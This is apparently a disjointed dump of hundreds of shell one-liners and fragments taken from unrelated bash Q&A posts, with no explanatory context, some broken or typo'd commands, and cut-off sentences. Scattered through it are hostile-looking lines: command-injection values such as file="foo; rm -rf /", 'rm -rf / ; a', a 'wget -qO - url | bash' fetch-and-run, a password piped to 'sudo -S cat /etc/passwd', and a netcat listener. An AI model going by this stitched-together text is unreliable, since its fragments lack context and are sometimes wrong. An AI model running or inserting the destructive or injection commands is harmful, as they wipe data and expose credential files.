awk -v n=$n '/regex/{p++} p>=n' file
awk -v n=$n 'p>=n; /regex/{p++}' file
tac file | awk -v n=$n 'p<n; /regex/{p++}' | tac
tac file | awk -v n=$n '/regex/{p++} p<n' | tac
tac file | awk -v n=$n '/regex/{p++} p>=n' | tac
tac file | awk -v n=$n 'p>=n; /regex/{p++}' | tac
tail -r
cd wo[tab]
cd work
su - otherUser
sudo su - otherUser
exit 1
{ }
{for(i=1;i<NF;i++) $i=$(i+1); NF=NF-2}
sed -e
man bash
About shell bulletin eval:
mysql -u root -p
1:/usr/lib/scarychacacters_\"@#\$:%\^\&:\*\(\)\{\}\[\]\;\ 2:a\ 3:o\
echo "-htns crl" "qjkx"
-htns crl qjkx
-htns crl
printf "%q"
-htns\ crl qjkx
"-htns crl" "qjkx"
cat: Hellooo test: No such file or directory
No such file or directory
$NOW : Version $VERSION already installed on HOSTNAME!
top -b -n 1 | sed -n '7,12p'
VERSION=$( echo "0,4,1,101 2013-05-18" )
"Connection refused by host"*)
VERSION=$(some command here|tr -d "\r")
total salaried
total hourly
do script
man grep
grep -R WORD ./
grep WORD ./path/to/file.ext
grep "\b$word\b"
c2 ac
bla bla bla example{at sign}gmail.com
#######{at sign}#####.###
first.name@gmail.com --> #########@#####.###
declare -F
<\This is the text I need>
/usr/bin/touch /Users/username/Desktop/file
/bin/sh /Users/username/Desktop/my.sh
sort grades.csv -o grades.csv
ls -R
ls -1
ls -R
#!/usr/bin/env sh
if [ -d "/home/$USER_ID" ]; then
-eq 0
sed 's/^/test line /g' textfile
sed '$s/^/sample text /' textfile
sed "$s/^/$var1" text file
$xavg | sed -r 's/^([^.]+).*$/\1/; s/^[^0-9]*([0-9]+).*$/\1/'
nzsql -c 'select S4(x,y,aum,nol) from test'
crontab -e
hg status
hg incoming
hg incoming --template "{files % '{file}\n'}" | grep SOMESTRING
-bash: android: command not found
vi .bash_profile
source ~/.bash_profile
source ~/.zshrc
touch ~/.bash_profile; open ~/.bash_profile
export PATH=${PATH}:/Development/android-sdk-macosx/platform-tools:/Development/android-sdk-macosx/tools
source ~/.bash_profile
cd ~
vi .bash_profile
source .bash_profile
Why does the value of '?' change in that folder and only that folder.
echo ?
echo ?
$(( expression ))
[[ expression ]]
[[ ... ]]
set -u
gcc --version
wget https://github.com/git/git/archive/v1.8.4.2.tar.gz
tar zxvf v1.8.4.2
cd git-v1.8.4.2
./configure prefix=/home/$USER --with-curl --with-expat
bash: ./cofigure.ac: No such file or directory
<div class="p_header_bottom"></div
awk  '/<div class="p_header_bottom">/,/<\/div>/'
awk  '/<\/span>/,/people/'
<div> </div>
bind ^k /path/to/script
bind ^k exec /path/to/script
locate Term/ReadKey.pm
cpan Term::ReadKey
read -d
bc -l
od -t x8 -An
echo "<BASE64>" | base64 -d | hexdump -v -e '/1 "%02x" '
./droptobox list Test
/dev/null 2>&1
grep -q
man grep
-q, --quiet, --silent
./upload.sh $ARG1 $ARG2 $ARG3
./upload.sh --resource blah --container blahblah --appname blablahblah
[[ -s "$HOME/.rvm/scripts/rvm" ]] && . "$HOME/.rvm/scripts/rvm"
open ~/.bash_profile
rm -r "My Application.app"
... | xargs grep ...
gnu awk
[^ ]*\.
GET /domain.si
shopt -s nullglob
man diff
s#^\( *\).*#\1</head>#"
make defconfig CONFIG_DEBUG_INFO=y && make
make allnoconfig
make KCONFIG_ALLCONFIG=my-custom.config allnoconfig
make defconfig
make oldconfig
make olddefconfig
readlink -f
readlink -f
echo ${JAVA_HOME##${JAVA_HOME%/*/*}}
foo ,
foo )
command | while read
done < <( commands )
sudo jexec $jid who
su my_user -c
watched_filename EVENT_NAMES event_filename
printf "%14s  %14s  %14s  %14s  %14s\n" $(cat data.txt)
pr -5 -l1 -t
0.8725220D- 0.1609633D- 0.2598447D-
-s' '
-w 100
pr | awk
delete a
exit 1
Telephone number
sed "/$Name/d" $PAYROLL
source bash_profile
source bash_profile
source bash_profile
python - arg1 arg2 <<'__SCRIPT__'
source $FILE
cat -vte file
eval \$$cmd
eval $cmd
eval \$$cmd
eval "${!cmd}"
else stmt
xargs -0
${string: -3}
grep -o
substr(string, start, length)
help read
unable to load main class com.intellij.idea.Main
cygpath --absolute --windows "$JAVA_HOME/bin/java.exe"
eval "/cygdrive/c/Java/jre7/bin/java.exe"
readlink $HOME/.slate.js
Found 127.0.0.1
Found 
zip myArchive sos.*
find ... -exec XXX {} \;
grep -l
cut -d: -f1
-type f
a=(`cat test.text`)
a[1]=apple of
a[2]=one's eye
Domains [0/1]\n
\nDomains [\d+/\d+]
sed ':a;N;$!ba;s:\nDomains \[[0-9]\+/[0-9]\+\]:#:g'
sed q
tail -n1
cut -b6
gnu grep
shopt -s nullglob
gnu sed
sort -k2,1
sort -s
theloop | while read line; do echo $line and do something with it;done
export LC_CTYPE="utf-8"
export LC_CTYPE="en_US.utf8"
locale -a
man bash
command 1
command 2
set -e
set -e
set -e
UseDNS no
brew install
grep -E
man find
'scriptName' gedit
When command exits: Exit the terminal
source /path/to/your/script gedit
. /path/to/your/script gedit
alias your_alias_name='. /path/to/your/script'
sudo service jetty start
ssh -t -i key.pem ec2-user@instance.domain.com 'sudo service jetty restart'
sudo nohup service jetty restart &
make list1
make list2
make listA
make list4
./$(BIN) fileName &
:%w !python
ffmpeg -i $1 $output_dir"/$reel_$base.mp4
ffmpeg -i $1 $output_dir"/$reel_$base.mp4
make list
for f in [some list of values that might contain spaces]
chmod 777
set -x
netstat -nap | grep 80
A quick
brown fox
"A quick "
a[1] =~ ^var.*
echo "Hey" | ./myscript.sh
wc -l
( ... )
man RSA_check_key
goto end;
Save target as
test-M => test-N
mv -nv xxx yyy
test-x => test-y
folder1/ folder2/ folder3/
folder1 folder2 folder3
shopt -s nullglob
shopt -s nullglob
shopt -s failglob
wget -i <filename>.txt
file name is too long
wget -O <target filename> <URL>
bc -l
"2275859/3" | bc -l
[[ $altitude < $atmo ]]
.PHONY: plugins
sort file1 -o file2
sort file1 > file2
-o file2
-o filename
twisted 13.2.0
commit 1d0bdc5c6ac331fdcb6f6c0f897507fcf833f616
pip install Twisted==11.1.0
pip install Twisted==11.1.0
sudo ./bin/carbon-cache.py start
exec 3<&0 ...
make list
make list > output.txt
/bin/bash: line 8: kill: (2970) - No such process
/bin/bash: line 9:  2973 Terminated              ./analyze $f
make list > output.txt
grep:textfile1.txt no such file or directory
line 10 syntax error 'else'
(( 0 == 0 ))
contents='echo win && echo 32'
win && echo 32
set -x
printf win && printf 32
date +%Z
kill %1
sed -i '/.*100\.am/d' your_file
sed ... | diff - <(sed ...)
ssh-copy-id $user@$server_name
null record separator
rm -r /var/some/dir/*
man rm
shopt -s nullglob
|| error handling
shopt -s dotglob
date -d
cmd1 | { f=$(mktemp) && cat >$f; cmd2 <$f; cmd3 <$f; rm $f; }
mktemp -t tmp
mktemp -t XXXX
VAR="$VAR\nin a box"
printf "%s\n" "$VAR"
glenn jackman
git commit  -m
line 21: [49: command not found
printf -v VAR FORM ARGS
sprintf FORM ARGS
TC_SPC=$(printf "%${COLUMNS}s" '')
So essentially striping away the everything from the last period...including the period.
host $host
$host has address xxx.xxx.xxx.xxx
cut -d ' ' -f 4
Run dialog box
cmd /c (start /b "%cd%" "C:\Program Files\GitW\git-bash.exe") && exit
cmd /c (start /b "%cd%" "C:\Program Files\GitW\git-bash.exe") && exit
This PC
"C:\Program Files\Git\git-bash.exe" --cd="e:\SomeFolder"
"C:\Program Files\Git\git-bash.exe" --cd="%1"
bash -s
man bash
export PATH=$PATH:$GOPATH/bin
export GOPATH=/Users/sSmacKk/go/
export GOPATH=/wherever/you/want/
export PATH=$PATH:$GOPATH/bin
source .bash_profile
ls -l
ls -l test*
stat -f '%Lp'
fakeswap.sh: 5: Bad substitution
sudo sh fakeswap.sh
NEW="$[SWAP*1024]"; TEMP="${NEW//?/ }"; OLD="${TEMP:1}0"
rm ?
rm \?
rm "?"
help read
sh -c
echo -e "echo 'AAA'; for x in 1 2 3; do echo 'BBB'; done; echo 'CCC'" | bash
Stopping nginx:                                            [  OK  ]
Starting nginx:                                            [  OK  ]
Stopping nginx:                                            [  OK  ]
cat >
GNU bash, version 4.2.37(1)-release (x86_64-pc-linux-gnu)
cp file_to_copy.txt
cp --backup=t
port install gdb
-bash: gdb: command not found
sudo port install gdb
<div id="wrapper"></div>
bad flag in substitute command: 'd'
\<div id=\"wrapper\"\>
$(( ... ))
$(( ))
number=$(date -d yesterday +%d)
-type f
-exec rm -f
-type f
-exec rm -f
ls -ltr
-type f
git version 1.8.3-preview20130601
Git (version 1.8.4-preview20130916)
git version 1.9.0.msysgit.0
git config core.fscache true
git for-each-ref
git for-each-ref
git for-each-ref --format=<...>
"Script version --> "
{ ... }
< and >
awk '/one/ && !x {print $0; print "\tone-one\n\tone-two\n\tone-three"; x=1;next} 1'
grep -o
hello world
hello world
grep -l "hello world" *.txt | wc -l
read -sdR
read -s -d -R
read -s -d R
(( ... ))
echo $PS1
\[\e]0;\u@\h: \w\a\]${debian_chroot:+($debian_chroot)}\u@\h:\w\$
PS1="\n\[\e]0;\u@\h: \w\a\]${debian_chroot:+($debian_chroot)}\u@\h:\w\$"
printf "%$((COLUMNS-1))s"
echo "%"
echo -en "\E[6n"
stty -echo
stty echo
modTime=$(stat -f "%m" -t "%s" $filepath)
modTime=$(date +%s -r $filepath)
tr --help
sed -i '/HTTP/d' $f
sed -E -i '/HTTP|RT/d' $f
sed -i '/HTTP/d;/RT/d' $f
for i in $(ls); do echo ${i}; done
. $file (env)
read -s
-s Silent mode. If input is coming from a terminal, characters are not echoed.
if "%password%"=="SuperUser"
| wc -l
rvm use 1.9.3
gem install camper_van
RVM is not a function, selecting rubies with 'rvm use ...'
./myservice start
./etc/init.d/mysql start
a.sh, b.sh, c.sh
a.sh, b.sh, c.sh
< /dev/null
RESD=$(echo $RESD | cut -c1)
sudo pip install lxml
logname < /dev/null
chmod 000
cd /mydir
ls ? ?.*
cd /mydir; ...; cd -;
ls ? ?.* /mydir
ls /mydir/? /mydir/?.*
shopt -s nullglob
touch $'a.lol\nlol\n\lol\nlol\nlol'
cd 1122337\ pictures\ of\ kittens/
➜ cd 1122337\ pictures\ of\ kittens/
" is "
"'s "
echo -e
"s/ is /${r}'s${x}/g"
crontab -e
echo "=== set: ============ " ; set ; echo "=== env: ============ " ; env
screen -ls
/usr/bin/screen -dmS rsyncSess watch -n 5 uptime
screen -ls
screen -ls
bash -c 'short_command; exec bash'
defzombie ZZ
if [ "$file_hash" == "$a" ];
<( )
man grep
xargs -0
rm -rf / ; a
wget --user="jim" --password="xxx-yyy-zzz" "http://updates.atomicorp.com/channels/rules/subscription/VERSION"
wget $WGET1
ls -la f*
ls -la f*
echo f*
ls -la f*
ls -la file1 file2 file3
ls -la f*
top | grep chromium
top | grep chromium >> load.log
stty -a
man signal
man 7 signal
(utf-8-unix . utf-8-unix)
export PS1='a'
unset PROMPT_COMMAND
printf "\n"
declare -f Name
echo $a
echo "$a"
cat  mylog.log |   grep  "Error code" | sort | uniq -c
'/tmp/components/ab.sql /tmp/b.sql'
No such file or directory
... | head -n -2
-F'[ ,]'
print $2, $4"."$5
-f tmp.csv
-f tmp.csv
>  tmp.csv
chmod +x test.sh
bash -c
bash -c
crontab -l
date +%s
ip addr
ip addr
ip addr
ip addr
sed -i -e
rm: cannot remove 
perl script.pl vectorFile matrixFile [>outFile]
<<- ENDSSH
killall -HUP Finder
git checkout -b {GITUSERNAME}/ticket-{TICKET-NUMBER}
git checkout -b oscar/ticket-1234
git nt 1234
git cot 1234
-v name="$value"
@reboot /sbin/ghost boot &> /home/mary/.ghost.log
@reboot /sbin/ghost boot > /home/mary/.ghost.log 2>&1
sox -m <filename> <filename> <filename>
IFS=" "
m$(printf "%04d" $i).wav
awk -f" " { print $1 } sentences.txt
$vim -c ":edit first|:tabnew second|:vsplit third|:split fourth|:wincmd w|:split fifth"
wc -m
tail -f tempfile
bash myscript foo 3
mystartcommand -p $port -n node$1 --deamonize
1 2
watch -n1 './script.sh'
cat file.out | mail -s reportfile email@email.com
'/TST STARTS/ {p=1}
p && /MATCH/ {print "line "NR" --> "$0}
/TST FINISHED/ {p=0}
TST FINISHED
cat -n
sleep 5
timeout 2>/dev/null 1 sleep 2
cdwin "J:\abc\def"
cd /usr/abc/def/
cdwin 'J:\abc\def'
ls |grep toto
echo -
cat -
cd -
perl -e "print @ARGV;" -
FOR /F
help for
for /?
IN ('someCommend')
echo -e
echo -E
echo "$var"
env echo ...
tr -d '[]'
... | tr -s "[" "" | tr -s "]" ""
export -f scp
"Â10.41.89.50 "
echo "Â10.41.89.50 " | sed s/[^\w.-]//g
echo "Â10.41.89.50 " | sed s/[\w.-]//g
echo "Â10.41.89.50 " | sed s/[\w^.-]//g
var='<font color="red">HELLO WORLD</font>'
var="<font color=\"red\">${TMPSTOR}</font>"
echo "$STORAGE[1]"
if [ $SETFLAG_1942 = "YES" ];
[[ ${str1} < ${str2} ]]
ls -la /.dockerenv
.dockerenv .dockerinit
cat /proc/1/environ|tr "\0" "\n"|grep container
ps -ef | grep '\['
insert key
sed -i "s/${MATCH}/${REPLACE}/g" ${FILENAME}
``` part evaluates to either the pid of the process if found, or nothing if no process is found. The single
notation is a synonym for the
builtin (or command on earlier systems) which happens to return
if its argument is a nonempty string and
if it is given no argument. So when a pid is found, the test becomes something like
which evaluates to true and
`` notation has been deprecated in favour of the
find -size 1c
find . -type f -size -4c
find -size
-size -5c
-maxdepth 1
-exec mv {} temp/ \;
find . -type f -maxdepth 1 | xargs du | sort -n |grep "^[0-5]\t"|sed "s/[0-5]//"|sed "s/^.//"|xargs -I ARG mv ARG temp/
width=$(($(tput cols)/2))
diff dir1 dir2
Only in \([^ ]*\):
[^ ]*
diff -aqr /tmp/d1 /tmp/d2
-F'[ :]'
is like a
system("cp -a "$3"/"$NF " /tmp/d3/")
banana &
cp -t target -- source1/IMG_foo.JPG source2/IMG_bar.JPG
while read …
file: ... .jar
mkfifo IN OUT
sleep 999999999 > fifofile
"$text / 10"
50 k
$text 10 /
sed -r
User of...
for section in sections
OID_A=snmpwalk -v2c -c Canopy "each_IP_of_O55" 1.3.6.1.4.1.161.19.3.3.1.1
OID_B=snmpwalk -v2c -c Canopy "each_IP_of_O55" 1.3.6.1.4.1.161.19.3.3.1.9
OID_C=snmpwalk -v2c -c Canopy "each_IP_of_O55" 1.3.6.1.4.1.161.19.3.1.4.1.49
echo "${OID_A}   ||   ${OID_B}   ||   ${OID_C}"
/path/to/script $ip
-m 1
set -eu
shopt -s nullglob
expr: syntax error
#!/bin/bash -x
alias m='man'
complete -F _man m
$ man
$ complete -p | grep _man
$ m
GNU bash, version 4.2.45(1)-release (x86_64-pc-linux-gnu)
$ m
$ man
complete -F _man m
complete -F _man man m
date -r
rm "$1"
| sh
date +%a
sudo ./buildAll.sh
chmod -r 777 buildAll.sh
chmod +x
sudo chmod +x buildAll.sh
setopt nonomatch
setopt NULL_GLOB
setopt nullglob
setopt failglob
setopt nonomatch
$(cmd args)
man bash
bash -c
tail -n $n file | head -n 1
tail | head
cmd <&- &
echo \${pid}
echo \${pid} > $PID_FILE
echo \${pid} >> $PID_FILE
case r_close_this:
strace -f
"setting= "
svn status
man sort
--reverse (-r)
--stable (-s)
set -x
java "$(cat $CMD)" $in > $out
arr[ "0==0 2==1" ]
echo $?
shutdown -c
bash -c "nohup /sbin/shutdown -h 10" &
echo "/sbin/poweroff" | /usr/bin/at now + 10 min >/dev/null 2>&1
sudo -i
# shutdown -h 20:00 &
# shutdown -r 20:00 &
else if
test ...
[ ... ]
( ... )
-maxdepth 1
find . -regex '.*/[^_].*\.html$' | while read file; do [need to do the copy X.html file to create new _X.html.erb file in here]; done
I would like to replace the part of each file path
exec 2>&1;
> /dev/null
echo $sum
while read
for ... $(...)
while read
stat -c%s
Let suppose the the user inputs the file name as /usr/test/abc.txt which comes in second positional parameter in my script
I want to make below statement as true how can I achieve this
shell glob
[[ ]]
[ ]
cd to
export PATH=$PATH:~/bin
source ~./zshrc
source ./bashrc
if syntax
git log
git log <remote>/<branch>
bash script: (test2.sh)
echo ${app_name}-hi
man diff
grep -n -o
for loop
sed -n -e 273p -e 273q filename.txt
man 1 bash
svn up
"hello there"
ln -s
sed -i
sh $startupfile
'sh $startupfile'
sh "$startupfile"
echo "$startupfile"
sh ./server1/bin/startup.sh
chmod u+x "$startupfile"
(trap "" INT;echo 1;sleep 5;echo 2)
(trap "echo hi" INT;echo 1;sleep 5;echo 2)
"R -e \\"
install.packages('shiny', repos='http://cran.rstudio.com/')
export USER1=/usr/lib/nagios/plugins
os.system('sleep 1 && echo foo && sleep 5 && echo bar')
os.system('sleep 1 && echo foo && sleep 5 && echo bar &')
apt-get install libxml-xpath-perl
[ "$?" != "0" ]
[ $? != 0 ]
sudo echo ' 15  9  *  *  * root /opt/script.sh' >> /etc/crontab
sudo echo ' 15  9  *  *  * root /opt/script.sh'
su -c
sudo sh -c "echo ' 15  9  *  *  * root /opt/script.sh' >> /etc/crontab"
(sleep 60) & wait
(sleep 60 &); wait
if I execute (sleep 60 &); wait then no waiting occurs.
sleep 60 &
child sleep process
grep -w
#!/usr/bin/env bash
git clone
unset GIT_DIR
mkdir "$TMP" && rmdir "$TMP"
[ -d $DIRNAME ] && { rmdir $DIRNAME || exit }
ls -t1 "$TMP
sed -e 's/_\(.*\)$/& \1/'
sed 's/^\(._.\)_/\1 /;s/^ _ /???/; s/ _ $/???/'
set -x
local variab=1
subprocess.call(filename, shell=True)
man script
which gem
bind "Tab: menu-complete"
man lockfile-create
ls command
username pts/0
{ [Error: spawn EACCES] code: 'EACCES', errno: 'EACCES', syscall: 'spawn' }
-v OFS=';'
ulimit -n
-t un
-t tn
ulimit -n
./myscript.sh 2011
./myscript.sh 201108
myscript.sh 201108{12..25}
myscript.sh 201108{12..25}
myscript.sh 20110812 20110813 20110814 ...
foo.pl 2>&1 | tee foo.log
while :
read ENV?"Type: "
Type: <choice>
<(echo 'foo "bar" baz')
printf "$string_to_sign" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$HEXKEY -binary | base64 -w0
echo -n
echo -n
Why doesn't the first one work?
GNU bash, version 4.2.45(1)-release (i686-pc-linux-gnu)
(( elem+=1 ))
set -e
(( 0 ))
elem=0; (( elem++ ))
set -e
0xE2 0x80 0x8B
set -e
echo "test"
set -e
set -e
set -e
set -e
set -e
#!/bin/bash -e
set -e
set +e
set -e
|| true
gcc -c imgconvert.c -o myProgram.o
#! /path/to/interpreter
stat -f "%p" $x
<p>This is the first line</p>
<html><head><title>Some title</title></head><body style="word-wrap: break-word; -webkit-nbsp-mode: space; -webkit-line-break: after-white-space; ">Some text goes here
set title
program.py ~/path/to/program.py - VIM
set -o vi
set -o emacs
emacs on/off
vi on/off
set -o emacs
set -o vi
set -o
bind -v | egrep ' editing| keymap'
man bash
man bind
export EDITOR=vi
"C:/cygwin/bin/bash -c"
Runtime.exec(command.split(" "))
system("touch " + file)
file="$(rm -rf /)"
file="foo; rm -rf /"
file="`rm -rf /`"
file="&rm -rf /"
file="\nrm -rf /"
file="foo bar"
file="foo # bar"
file="foo -bar"
source .bashrc
-i lo
#Trusted Traffic
# shellcheck disable=SC2139
man pcrepattern
grep -o
which <name>
ls -l
Can someone give a script example?
ls -l
mkapp createddir
mkapp createddir | cd
-bash: echo: write error: Broken pipe
command substitution
kill -<SIGNAL>
echo "First Second Third Fourth Fifth" | cut -d " " -f2-
command substitution
sed -f commands config.file.txt
/^backend ${cluster}_cluster *$/
/bin/bash: flirt: command not found
setenv('PATH', [getenv('PATH') ':/usr/local/fsl/bin']);
Error on ft_putendl_fd.
$(( ))
$(( ))
mkdir -p "/usr/local/share/doc/tcc"
fgrep -w
find /var/tmp/stuff -mtime +90 -iname "backup*" -print | xargs /bin/rm
find /var/tmp/stuff -mtime +90 -iname "backup*" -exec /bin/rm '{}'
-type f
find /var/tmp/stuff -type f -mtime +90 -iname "backup*" -delete
-type f
find -print0
xargs -0
cvs rm
cvs rm -f
export PATH
export PATH
sed "s/[*]/[0-9]\{1,\}/g"
gem install foundation
foundation new PROJECT_NAME
-type f
-name \( logical condition \)
\( ... \)
-name pattern
echo $tmpstr
echo $tmpstr" "
cat $HOME/myfile.txt >>$file
echo >>$file
if ... then return else ...
gunzip -c
command returned bad code: -101
cat try.txt |  awk '{if ($1 == "sn::") base64 -d $2'
substr(index($0, $2))
sudo su
login user
open(items, 'rb')
hello world
1:2 world
sudo update-postfix helloworld
FILES=/etc/test/file1 /etc/test/file2 ...
-exec sh ...
if [ $a==1 ]
MDR_ITEM_E1 /
tar --help' or
uniq -cd
if [[ $? -ne 0 ]];
$? -ne 0
[[ $? -ne 0 ]]
help if
vi /usr/local/bin/dowatch
echo meme
. script
source script
. cmakeclean
#!/bin/bash -f
/bin/bash -f scriptname
. scriptname
cat test.sh | bash
cat test.sh | bash
wget -qO - url | bash
The script have to be started by cat test.sh | bash,
cat test.sh | bash
read -i aaa
echo $aaa
read -i aaa
read aaa
bash test.sh
echo $?
[ $file1 -eq $file2 ]
[ "$file1" = "$file2" ]
pgrep cron
column -s$'\t' -t <original file>
column_ansi --help
column_ansi -h
using mac so no wget
<a href=link> <target=blank>
<a href="http://wallbase.cc/wallpaper/' wallbase.source
linux chroot jail
perl's rename
dup2(1, 15)
dup2(0, 8)
dup2(1, w); close(w)
dup2(0, r); close(r)
CentOS release 6.4 (Final)
echo exec(whoami)."\n";
chmod 777 apachelogs -R
$ chmod +x find_valid_ids.py
$ ./find_valid_ids.py your_input_file.txt A00000000001Z
GNU Awk 4.1.0, API: 1.0
help false
export A=$(false); echo $?
var=foo command...
export var=foo
set -e
local variable="$(command)"
local variable="$(command)"
while read -r line
substring expression < 0
shopt -s nullglob
files=( $(ls *.pdf) )
dd: 'standard input': cannot skip to specified offset
man tail
paste -s
ps x |grep -v grep |grep -c "processname"
ps x |grep -v grep |grep -c "processname"
killall -9 process
process -b -c /usr/local/etc
ps x |grep -v grep |grep -c "processname"
process=$(ps x |grep -v grep |grep -c "processname")
/usr/local/bin/oscam1 -b -c /usr/local/etc/oscam1 -t /usr/local/tmp.oscam1
killall -9 oscam1
/usr/local/bin/oscam1 -b -c /usr/local/etc/oscam1 -t /usr/local/tmp.oscam1
paste buffer.txt XX > output.txt; mv output.txt buffer.txt
paste buffer.txt XX > buffer.txt
paste output.txt >> output.txt
cat ./filelist.txt | xargs paste output.txt
chmod +x /bin/i++
perldoc perlretut
Remove matching prefix pattern
do - done
kill -0
kill -0
trap [arg] [sigspec …]
sigspec …
cmd1 || cmd2
ps -p
10 seconds
print $1, $2, $11, $17
-L 1
head -n1
-P 4
find -print0
read -d ''
-maxdepth 1
chmod +x notify
_PREVT=$(date +%S)
[1] PID
test -f "/assets/certificates/$file"
cat <<- _EOF_
John 5 3
John 3 5
awk {'print $1'}
awk {'print $2'}
cat -vte $LIST
timeout 2 "$TAIL" "$filename"
| sh
\( ... \)
mv "&" "\1"
\( ... \)
<user> <hostname> = <full path to commands>
test ALL = /usr/bin/apt-get
echo http://www.google.com
echo google.com
if $runfile -eq "yes" then command; fi
npm install
sudo grunt install contrib-sass -g
gem install sass
sudo apt-get install ruby-full
brew install saas/sass/sass
num1=$[ num1 + num2 ]
/path/to/script.sh /path/to/images average.png image/1.png image/2.png"
exec("/path/to/script.sh /path/to/images average.png image/1.png image/2.png")
2>&1 1> /dev/null
ulimit -c unlimited
php yourfile.php
/bin/bash --version
shuf -i 0500000000-0599999999 -o passwords.lst
nc -lp 8000
[ ]
array( )
bash luks.sh
bash luks.sh &
sleep 30 && bash luks.sh &
sudo: sorry, you must have a tty to run sudo
ls -l /some/folder
ls /some/folder -l
vagrant init some/vagrant/folder
vagrant some/vagrant/folder init
vagrant init
vagrant init
"* "
"* "
DIR=$(mktemp -d)
exit 0
exit 0
exit 0
return code 0
while read
while read
| tr -d '\r'
cmd | sed 's/\r//g'
exec >> /tmp/foo.log
join command
awk 'BEGIN{p=1} /^Include/ && p==1 {print "Include SED_ENTRY"; print; p=0}1'
"Include SED_ENTRY"
echo a{.,}b
a.b ab
mv /source/path/{.[!.],..?,}* /destination/path
find . -maxdepth 1 -exec mv {} .. \;
concatenate files and print on the standard output
ls /path/prefix*
rm result
-F '_'
git status
which psql
whereis psql
$(dirname $0)/..
export PARENT_OF_THIS_SCRIPT=$( cd $(dirname $0) ; pwd -P )
export PARENT_DIR_OF_SCRIPT=$( cd $(dirname $0) ; pwd -P | xargs basename )
$ ./findLatestDir.sh
$ findLatestDir
echo $SHELL
sar 1 >> filename
sar 1 | tee -a filename
tee -a
ls testfolder/*
ls testfolder/* | grep -R --exclude-from='.*_0VT0_.*'
#!/bin/bash -x
while true
ulimit -S -v unlimited
ulimit -H -v
| pv |
cow sheep
-O -
sed "s|^opt_path.*|opt_path = '${new_path}'|g"
shopt -s extglob
select table
bash -x your-script
[ .. ] can't match globs. Use [[ .. ]] or grep.
[ ... ]
[[ ... ]]
# Description
Please remove CD, close cdrom drive and hit return [2 minutes]
sleep X
usleep X
sleep 120
usleep 120000000
-iso-level 3
mkisofs -allow-limited-size -l -J -r -iso-level 3 -o <output.iso> <source file or directory>
genisoimage -allow-limited-size -l -J -r -iso-level 3 -o <output.iso> <source file or directory>
grep "$webserver" serverList.lst | awk '{print $1}'
grep '\btvtw2\b' file ...
grep -w
grep | awk
find /home/user/media  -type f -exec cp {} /home/user/flatmedia \;
exit 1
return 1
exit 0
return 0
yes n
iostat -x 1 -m
git p some_remote [TAB]
git p origin <TAB>
git alias
git push
git push
declare -F
grep -v
egrep -v ^(str1|str2|str3) filename
www-data ALL=(root) NOPASSWD: /etc/newserver.sh
sed -f -
"as is"
echo Testing!
cat file | mycommand
while read -r line || [[ -n $line ]]; do …
(( ++k ))
adb -s $deviceID shell
adb devices
adb kill-server
adb start-server
adb shell service list
ConnectivityManager.setUsbTethering(boolean enable)
adb shell su -c service call connectivity 34 i32 1
adb shell su -c service call connectivity 34 i32 0
adb shell su -c service call connectivity 30 i32 1
adb shell su -c service call connectivity 30 i32 0
adb shell su -c "service call connectivity 31 i32 1"
adb shell su -c "service call connectivity 31 i32 0"
int setUsbTethering(boolean enable, String callerPkg);
service call connectivity 34 i32 1 s16 text
service call connectivity 34 i32 0 s16 text
service call connectivity 33 i32 1 s16 text
service call connectivity 33 i32 0 s16 text
timeout -t
adb shell su -c service call connectivity 33 i32 1
tr -d '\r' <yourscript >fixedscript
tail -F -n0 /path/to/LOGFILE
cat /path/to/file|awk '...
tail -F -n0 /path/to/file|awk '...
myprocess -s
ps .. | grep ... | grep
grep "^Ppid:[[:space:]]*$pid" /proc/*/status
command -v
command -v
>/dev/null 2>&1
command -v
command -v
exit 1
./test input.txt > result.txt
-maxdepth 1
python my_script &> output
basename "${str}"
dirname "${str}"
sudo reboot
forever list
cd /var/www/ghost/
cd /var/www/ghost/
ps aux
group ID
ps -ef
find . -mtime +13 -delete
find . -mtime +13 -exec /bin/ls -lh '{}' \; | grep '<today>'
-mtime +13
find your/folder -type f -mtime +13 -delete
null RS
My work|abc-X7-27ABC |build
echo "${str//span style/|}"
echo "${str//span.*style/|}"
shell glob
str='My work</u><br />bob<foo>build'
diff list1 list2
. $(which your_function)
ls NONEXISTENT
rpm -qa | grep xxx
cat, awk, uniq
sed -i .bak -f sed.script config.conf
-f sed.script
sed -e "s/.../.../" -e "s/.../.../" -i .bak config.conf
YourScript.ksh YourTemplateFile YourDataSourceFile
ls -l pipename
printf command
printf "${a[@]}\n"
if statement
[ function=1 ]
[ ... ]
SyntaxError: invalid syntax
file -i update.py
text/x-python; charset=us-ascii
bash -x INSHALLAH
echo -e "PASSWORD\n" | sudo -S cat /etc/passwd
Question is != 1
[ "$q" = "1" ]
read -p
echo $(...)
export VAR=value
bash script.sh
Option one
Option one
. ./configScript.sh
echo mv
info bash
ps -ef
[ $# -eq 1 ];
Expands to the number of positional parameters in decimal.
man bash
$ ./script.sh hostnames.txt
read line
echo `df -hlg | awk -F/ '/disk*/ {print $5}'`
echo "`cmd`"
if [condition] = something
Some other text
() {
sh ./setup.sh
find . -type d
find . -type l
sed -i 's/AAA/ZZZ/g' filename
unique character
unique value
bash someScript.sh -p <some_path> -o <some_other_param> -i (User forget to provide value)
t b
. After that I run
and I want it to echo
é è à ....
a = b
a - b
find . -regex '.*\.hh?' -exec  grep -inH "IDENTIFIER" {} \;
[ $alarm_state = 0 -a -f $lockfile ]
[ "$alarm_state" = "0" ] && [ -f "$lockfile" ]
xmllint --xpath "/rates/currency[code='$code1']/rate/text()" rates.xml
exit 0
sudo sh filename.sh
sudo update-alternatives --config java
java -version
length ($3) - 1
for i in $(ls)
for file in *
sed -i 8i"sometitle" hi.csv
sed -n -e "/Next</a></p>/,/Next</a></p>/ p" file.txt
sed -n -e "/Next\<\/a\>\<\/p\>/,/Next<\/a\>\<\/p>/ p" file.txt
sed -n -e "/pattern1/,/pattern2/ p" file.txt
system default grep
./test.sh "This line is removed." "some text here" out.txt
JOB="00 12 * * * sh dosomething.sh" 
do mv
man bash
Parameter Expansion
man bash
CONDITIONAL EXPRESSIONS
ln -s
crontab -e
wc -l
wc -l ${file_name}
wc -l
wc -l
wc -l
wc -l
perldoc perlre
info bash
cat -vte
set -e
set -o pipefail
... | sed -e "s|^\.|0.|"
which ruby
ruby --version
rake routes
<an arbitrary number of words> <a list of ip addresses comma separated> <timestamp>
ip_list=$(echo $i | sed 's/\([0-9\.,]\)+/\1/')
grep -P (PCRE)
su mode
echo 120000 > /proc/...
chown 0:0 executable_name
chmod u+s executable_name
sudo ./masterinstall.sh
bash ./mygset.sh
gsettings set ...
>/dev/null 2>&1
sudo --preserve-env=DBUS_SESSION_BUS_ADDRESS ./masterinstall.sh
